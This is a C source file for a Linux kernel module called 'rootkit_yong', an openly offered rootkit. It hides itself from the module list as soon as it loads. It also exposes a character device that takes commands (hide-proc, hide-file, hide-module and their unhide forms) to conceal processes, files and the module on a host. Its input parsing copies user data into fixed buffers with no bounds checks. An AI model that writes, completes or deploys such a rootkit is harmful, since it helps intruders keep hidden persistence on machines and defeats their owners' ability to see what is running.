#include <linux/init.h>
#include <linux/module.h>
#include <linux/device.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#include "module.h"
#include "proc.h"
#include "file.h"

#define DEVICE_NAME "rootkit_yong"
#define CLASS_NAME "yong"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yong");
MODULE_DESCRIPTION("...");
MODULE_VERSION("0.1");

static int majorNumber;
static char message[256] = {0};
static char command[32] = {0};
static char pid[8] = {0};
static char filePath[64] = {0};
static short size_of_message;
static struct class* charClass = NULL;
static struct device* charDevice = NULL;

static int	dev_open(struct inode*, struct file*);
static int	dev_release(struct inode*, struct file*);
static ssize_t	dev_read(struct file*, char*, size_t, loff_t*);
static ssize_t	dev_write(struct file*, const char*, size_t, loff_t*);

int katoi(char* string) {
	long res;

	if(kstrtol(string, 10, &res) == 0)
		return (int)res;

	return -1;
}

static struct file_operations fops = {
	.open = dev_open,
	.read = dev_read,
	.write = dev_write,
	.release = dev_release,
};

static int __init rootkit_yong_init(void) {
	majorNumber = register_chrdev(0, DEVICE_NAME, &fops);
	if (majorNumber < 0) {
		printk(KERN_ALERT "majornumber failure!\n");
		return majorNumber;
	}
	
	charClass = class_create(THIS_MODULE, CLASS_NAME);
	if(IS_ERR(charClass)) {
		unregister_chrdev(majorNumber, DEVICE_NAME);
		printk(KERN_ALERT "class failure!\n");
		return PTR_ERR(charClass);
	}

	charDevice = device_create(charClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
	if (IS_ERR(charDevice)) {
		class_destroy(charClass);
		unregister_chrdev(majorNumber, DEVICE_NAME);
		printk(KERN_ALERT "device failure!\n");
		return PTR_ERR(charDevice);
	}

	
	printk(KERN_INFO "Rootkit_yong inserted :)\n");
	hide_module(1);
	return 0;
}

static void __exit rootkit_yong_exit(void) {
	device_destroy(charClass, MKDEV(majorNumber, 0));
	class_unregister(charClass);
	class_destroy(charClass);
	unregister_chrdev(majorNumber, DEVICE_NAME);
}

static int dev_open(struct inode* inodp, struct file* filep) {
	return 0;
}

static ssize_t dev_read(struct file* filep, char* buffer, size_t len, loff_t* offset) {
	return 0;
}

static ssize_t dev_write(struct file* filep, const char* buffer, size_t len, loff_t *offset) {
	int i = 0;
	int cursor = 0;
	char* storage = command;

	sprintf(message, "%s", buffer);

	while(1) {
		if(message[cursor] == ' ') {
			storage[i] = '\0';
			if (strcmp(storage, "hide-proc") == 0 || strcmp(storage, "unhide-proc") == 0) {
				storage = pid;
				i = -1;
			} else if (strcmp(storage, "hide-file") == 0 || strcmp(storage, "unhide-file") == 0) {
				storage = filePath;
				i = -1;
			} else if (strcmp(storage, "hide-module") == 0 || strcmp(storage, "unhide-module") == 0) {
				storage[i] = '\0';
				break;
			}
			else
				return -1;
		} else if(message[cursor] == '\0') {
			storage[i] = '\0';
			break;
		} else
			storage[i] = message[cursor];

		i++;
		cursor++;
	}

	if(strcmp(command, "hide-proc") == 0) {
		hide_file(pid);
		//hide_proc(katoi(storage));
	}
	else if (strcmp(command, "unhide-proc") == 0)
		unhide_file_all();
	else if (strcmp(command, "hide-file") == 0)
		hide_file(filePath);
	else if (strcmp(command, "unhide-file") == 0)
		unhide_file_all();
	else if (strcmp(command, "hide-module") == 0)
		hide_module(1);
	else if (strcmp(command, "unhide-module") == 0)
		hide_module(0);

	return 1;
}

static int dev_release(struct inode* inodep, struct file* filep) {
	return 0;
}

module_init(rootkit_yong_init);
module_exit(rootkit_yong_exit);


